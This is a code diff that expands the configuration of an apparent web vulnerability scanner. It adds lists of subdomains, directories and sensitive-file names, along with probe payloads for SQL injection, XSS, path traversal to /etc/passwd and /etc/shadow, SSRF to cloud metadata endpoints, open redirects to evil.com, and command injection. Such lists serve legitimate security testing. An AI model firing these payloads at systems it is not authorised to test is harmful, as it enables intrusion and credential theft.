@@ -44,23 +44,89 @@ ALIVE_STATUS_CODES = range(200, 400)  # 200-399 are alive
 # Subdomain discovery
 DEFAULT_SUB_WORDLIST = WORDLISTS_DIR / "subdomains.txt"
 COMMON_SUBDOMAINS = [
-    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
-    "cpanel", "whois", "admin", "api", "dev", "test", "staging", "qa",
-    "cdn", "static", "images", "assets", "media", "download", "blog",
-    "shop", "store", "app", "mobile", "api2", "v1", "v2", "old", "new",
-    "portal", "secure", "vpn", "remote", "ftp", "sftp", "backup", "db",
-    "database", "mysql", "postgres", "redis", "elastic", "kibana", "grafana"
+"www","mail","webmail","smtp","pop","imap","mx","ns1","ns2","dns",
+
+"admin","panel","dashboard","console","cpanel","whm","portal","manage","management",
+
+"api","api1","api2","api3","v1","v2","v3","backend","server","internal","private","gateway",
+
+"dev","test","testing","staging","stage","qa","uat","beta","demo","sandbox","preview",
+
+"cdn","static","images","img","assets","media","download","downloads","files","uploads","storage",
+
+"app","mobile","web","service","services","microservice","auth","login","signup","signin",
+
+"blog","shop","store","cart","checkout","payment","billing","support","help","docs",
+
+"secure","vpn","remote","access","firewall","auth","sso",
+
+"db","database","mysql","postgres","mongo","redis","elastic","kibana","grafana","monitor","metrics","logs",
+
+"backup","backups","old","new","archive","legacy","temp","tmp",
+
+"s3","bucket","fileserver","cdn1","cdn2","blob","firebase",
+
+"jenkins","gitlab","ci","cd","pipeline","build","deploy",
+
+"intranet","extranet","home","site","root","main","core","system","admin-dev","api-dev","test-api","dev-api","staging-api","internal-api","secure-api"
 ]
 
 # Directory discovery
 DEFAULT_DIR_WORDLIST = WORDLISTS_DIR / "directories.txt"
 COMMON_DIRECTORIES = [
-    "admin", "api", "app", "assets", "backup", "blog", "cdn", "config",
-    "data", "dev", "download", "files", "images", "js", "login", "mail",
-    "media", "old", "public", "secure", "static", "test", "tmp", "upload",
-    "uploads", "user", "users", "var", "view", "views", "web", "www",
-    "dashboard", "panel", "administrator", "manage", "portal", "console",
-    "auth", "account", "profile", "settings", "docs", "documentation"
+    # Admin / Control
+    "admin", "administrator", "adminpanel", "panel", "dashboard", "console",
+    "manage", "management", "portal", "control", "cpanel", "superadmin",
+    "sysadmin", "root", "backend-admin",
+
+    # Auth / User
+    "login", "signin", "signup", "auth", "authentication", "account",
+    "accounts", "user", "users", "profile", "profiles", "register",
+    "reset", "password", "forgot", "verify", "session", "oauth",
+
+    # API / Backend
+    "api", "api/v1", "api/v2", "api/v3", "backend", "server", "internal",
+    "private", "services", "gateway", "graphql", "rest", "webhook",
+    "endpoints", "service", "microservice",
+
+    # Dev / Test / Staging
+    "dev", "test", "testing", "staging", "stage", "prod", "production",
+    "sandbox", "beta", "demo", "debug", "uat", "qa", "preview",
+
+    # Files / Uploads
+    "upload", "uploads", "file", "files", "download", "downloads",
+    "media", "images", "img", "assets", "static", "public",
+    "attachments", "documents", "docs", "storage", "cdn",
+
+    # Config / Sensitive
+    "config", "configs", "conf", "settings", "env", ".env", ".git",
+    ".svn", ".htaccess", "backup", "backups", "old", "archive",
+    "db", "database", "sql", "dump", "secrets", "keys", "privatekey",
+    "credentials", "token", "tokens",
+
+    # Logs / Temp / Cache
+    "log", "logs", "tmp", "temp", "cache", "sessions", "session",
+    "runtime", "debug-log",
+
+    # Web / Pages
+    "blog", "news", "docs", "documentation", "help", "support",
+    "about", "contact", "status", "health", "info", "faq",
+
+    # Mail / Communication
+    "mail", "email", "smtp", "inbox", "notifications",
+
+    # CMS / Framework specific
+    "wp-admin", "wp-content", "wp-includes",
+    "joomla", "drupal", "magento",
+    "laravel", "django", "flask", "express",
+
+    # Hidden / Interesting
+    ".well-known", ".config", ".backup", ".old", ".temp",
+    ".cache", ".history",
+
+    # Misc
+    "web", "www", "site", "home", "index", "root",
+    "main", "app", "system", "core"
 ]
 
 # FIX #6: HIGH-RISK ENDPOINT KEYWORDS - Expanded for better detection
@@ -69,29 +135,49 @@ HIGH_RISK_ENDPOINT_KEYWORDS = [
     # Authentication & Authorization
     "admin", "login", "logout", "signin", "signup", "register", "auth",
     "oauth", "sso", "password", "reset", "forgot", "verify", "confirm",
-    
+    "token", "jwt", "session", "sessions", "apikey", "api-key",
+
     # User & Account Management
-    "user", "users", "account", "profile", "settings", "preferences",
-    "dashboard", "panel", "portal", "console", "manage", "management",
-    
+    "user", "users", "account", "accounts", "profile", "profiles",
+    "settings", "preferences", "dashboard", "panel", "portal",
+    "console", "manage", "management", "adminpanel",
+
     # API & Data Access
     "api", "graphql", "rest", "v1", "v2", "v3", "endpoint", "service",
-    
-    # Sensitive Operations
-    "upload", "download", "file", "files", "document", "export", "import",
-    "backup", "restore", "delete", "remove", "update", "edit", "modify",
-    
-    # Internal/Debug
-    "debug", "test", "dev", "staging", "internal", "private", "secure",
-    "config", "configuration", "setup", "install", "phpinfo", "info",
-    
-    # Financial & Transactions
-    "payment", "checkout", "cart", "order", "invoice", "billing", "subscription",
-    
-    # Database & Admin
-    "database", "db", "sql", "query", "phpmyadmin", "adminer", "phpMyAdmin"
-]
+    "services", "internal-api", "private-api",
 
+    # Sensitive Operations
+    "upload", "uploads", "download", "downloads", "file", "files",
+    "document", "documents", "export", "import", "backup", "backups",
+    "restore", "delete", "remove", "update", "edit", "modify",
+    "execute", "run", "cmd", "command",
+
+    # Internal / Debug / Config
+    "debug", "test", "testing", "dev", "staging", "internal", "private",
+    "secure", "config", "configuration", "setup", "install",
+    "phpinfo", "info", "env", ".env", ".git",
+
+    # Financial & Transactions
+    "payment", "checkout", "cart", "order", "orders", "invoice",
+    "billing", "subscription", "wallet", "transactions", "txn",
+
+    # Database & Admin
+    "database", "db", "sql", "query", "dump", "backup-db",
+    "phpmyadmin", "adminer", "dbadmin",
+
+    # Cloud / Storage
+    "s3", "bucket", "storage", "cdn", "blob", "firebase",
+
+    # Logs / Monitoring
+    "log", "logs", "audit", "monitor", "metrics", "health", "status",
+
+    # DevOps / CI-CD
+    "jenkins", "gitlab", "ci", "cd", "pipeline", "deploy", "build",
+
+    # Misconfig / Sensitive Files
+    ".htaccess", ".htpasswd", ".aws", "credentials", "secrets",
+    "privatekey", "keys", "id_rsa"
+]
 
 def is_high_risk_endpoint(endpoint: str) -> bool:
     """
@@ -110,10 +196,30 @@ def is_high_risk_endpoint(endpoint: str) -> bool:
 SQLi_PAYLOADS = [
     "' OR '1'='1",
     "\" OR \"1\"=\"1",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 'a'='a",
     "'--",
+    "'#",
+    "'/*",
     "' AND 1=1--",
     "' AND 1=2--",
+    "' AND '1'='1",
+    "' AND '1'='2",
+    "'\"",
+    "'`",
+    "' OR '1'='1'-- -",
     "' AND SLEEP(3)--",
+    "'; WAITFOR DELAY '0:0:3'--",
+    "' OR SLEEP(3)#",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT 1--",
+    "' UNION SELECT NULL,NULL--",
+    "1 OR 1=1",
+    "1 AND 1=2",
+    "1 OR SLEEP(3)",
+    "%27 OR %271%27=%271",
+    "%22 OR %221%22=%221"
 ]
 
 # XSS Payloads
@@ -123,35 +229,127 @@ XSS_PAYLOADS = [
     "\"><script>alert(1)</script>",
     "<svg/onload=alert(1)>",
     "javascript:alert(1)",
+    "<body onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "<input onfocus=alert(1) autofocus>",
+    "<details open ontoggle=alert(1)>",
+    "<a href=javascript:alert(1)>click</a>",
+    "<video><source onerror=alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<math href=\"javascript:alert(1)\"></math>",
+    "<object data=\"javascript:alert(1)\"></object>",
+    "<embed src=\"javascript:alert(1)\">",
+    "<img src=1 onerror=alert(document.domain)>",
+    "<svg><script>alert(1)</script></svg>",
+    "\"><img src=x onerror=alert(1)>",
+    "'><svg/onload=alert(1)>",
+    "<script>confirm(1)</script>",
+    "<script>prompt(1)</script>",
+    "%3Cscript%3Ealert(1)%3C/script%3E",
+    "%3Cimg%20src=x%20onerror=alert(1)%3E"
 ]
 
 # LFI Payloads
 LFI_PAYLOADS = [
     "../../etc/passwd",
     "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "../../../../../../etc/passwd",
+    "..\\..\\windows\\win.ini",
     "..\\..\\..\\windows\\win.ini",
+    "..\\..\\..\\..\\windows\\win.ini",
     "....//....//....//etc/passwd",
+    "....\\....\\....\\windows\\win.ini",
+    "/etc/passwd",
     "/etc/passwd%00",
+    "../../etc/passwd%00",
+    "../../../../etc/passwd%00",
+    "../../../../../etc/passwd%00",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "%252e%252e%252fetc%252fpasswd",
+    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "..%255c..%255c..%255cwindows%255cwin.ini",
+    "/proc/self/environ",
+    "/proc/version",
+    "/etc/hosts",
+    "/etc/shadow",
+    "/var/log/auth.log",
+    "/var/log/apache2/access.log",
+    "/var/log/nginx/access.log",
+    "/windows/system32/drivers/etc/hosts",
+    "/boot.ini"
 ]
 
 # SSRF Payloads
 SSRF_PAYLOADS = [
     "http://127.0.0.1",
     "http://localhost",
-    "http://169.254.169.254",  # AWS metadata
-    "http://[::1]",
     "http://0.0.0.0",
+    "http://[::1]",
+    "http://169.254.169.254",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/user-data/",
+    "http://metadata.google.internal",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://100.100.100.200",
+    "http://100.100.100.200/latest/meta-data/",
+    "http://192.168.0.1",
+    "http://192.168.1.1",
+    "http://10.0.0.1",
+    "http://10.0.0.0",
+    "http://172.16.0.1",
+    "http://172.16.0.0",
+    "http://127.1",
+    "http://2130706433",
+    "http://0x7f000001",
+    "http://0177.0.0.1",
+    "http://127.0.0.1:80",
+    "http://127.0.0.1:8080",
+    "http://127.0.0.1:22",
+    "http://localhost:80",
+    "http://localhost:8080",
+    "http://localhost:22",
+    "http://127.0.0.1/admin",
+    "http://localhost/admin",
+    "http://127.0.0.1/login",
+    "http://localhost/login",
+    "http://127.0.0.1/api",
+    "http://localhost/api"
 ]
 
 # Open Redirect Payloads
 OPEN_REDIRECT_PAYLOADS = [
     "https://evil.com",
+    "http://evil.com",
     "//evil.com",
+    "///evil.com",
+    "////evil.com",
     "/\\evil.com",
     "https:evil.com",
-    "////evil.com",
+    "http:evil.com",
+    "\\\\evil.com",
+    "\\/evil.com",
+    "%2f%2fevil.com",
+    "%2f%2fevil.com/",
+    "%5c%5cevil.com",
+    "%2fevil.com",
+    "/%2fevil.com",
+    "/%5cevil.com",
+    "https://evil.com@trusted.com",
+    "https://trusted.com@evil.com",
+    "https://evil.com%2f..",
+    "//evil.com/%2e%2e",
+    "//%65%76%69%6c.com",
+    "https://%65%76%69%6c.com",
+    "https://evil.com%00",
+    "//evil.com%00",
+    "https://evil.com/%00",
+    "javascript:location='https://evil.com'",
+    "javascript:window.location='https://evil.com'"
 ]
-
 # Command Injection Payloads (Light - safe for detection)
 COMMAND_INJECTION_PAYLOADS = [
     ";id",
@@ -159,10 +357,62 @@ COMMAND_INJECTION_PAYLOADS = [
     "&& whoami",
     "|| whoami",
     "`id`",
+    "$(id)",
+    "; whoami",
+    "| whoami",
+    "&& id",
+    "|| id",
+    "; uname -a",
+    "| uname -a",
+    "&& uname -a",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "&& cat /etc/passwd",
+    "; ls",
+    "| ls",
+    "&& ls",
+    "; pwd",
+    "| pwd",
+    "&& pwd",
+    "; echo test",
+    "| echo test",
+    "&& echo test",
+    "|| echo test",
+    "; sleep 5",
+    "| sleep 5",
+    "&& sleep 5",
+    "; ping -c 1 127.0.0.1",
+    "| ping -c 1 127.0.0.1",
+    "&& ping -c 1 127.0.0.1",
+    "; cat /etc/hosts",
+    "| cat /etc/hosts",
+    "&& cat /etc/hosts",
+    "|| cat /etc/hosts",
+    "& whoami",
+    "& id"
 ]
 
 # IDOR test values
-IDOR_TEST_VALUES = [1, 2, 3, 10, 100, 999, "admin", "test", "0"]
+IDOR_TEST_VALUES = [
+    0, 1, 2, 3, 4, 5, 10, 50, 100, 200, 500, 999, 1000, 1234, 9999,
+    -1, -10,
+
+    "0", "1", "2", "10", "100", "999",
+
+    "admin", "administrator", "root", "user", "test", "guest",
+    "demo", "support", "manager", "superuser",
+
+    "0001", "0010", "0100",
+
+    "true", "false", "null", "None",
+
+    "me", "self", "current",
+
+    "user1", "user2", "user123",
+    "admin1", "test1",
+
+    "abc", "xyz", "random"
+]
 
 # ============================================================================
 # PARAMETER CLASSIFICATION MAPPINGS
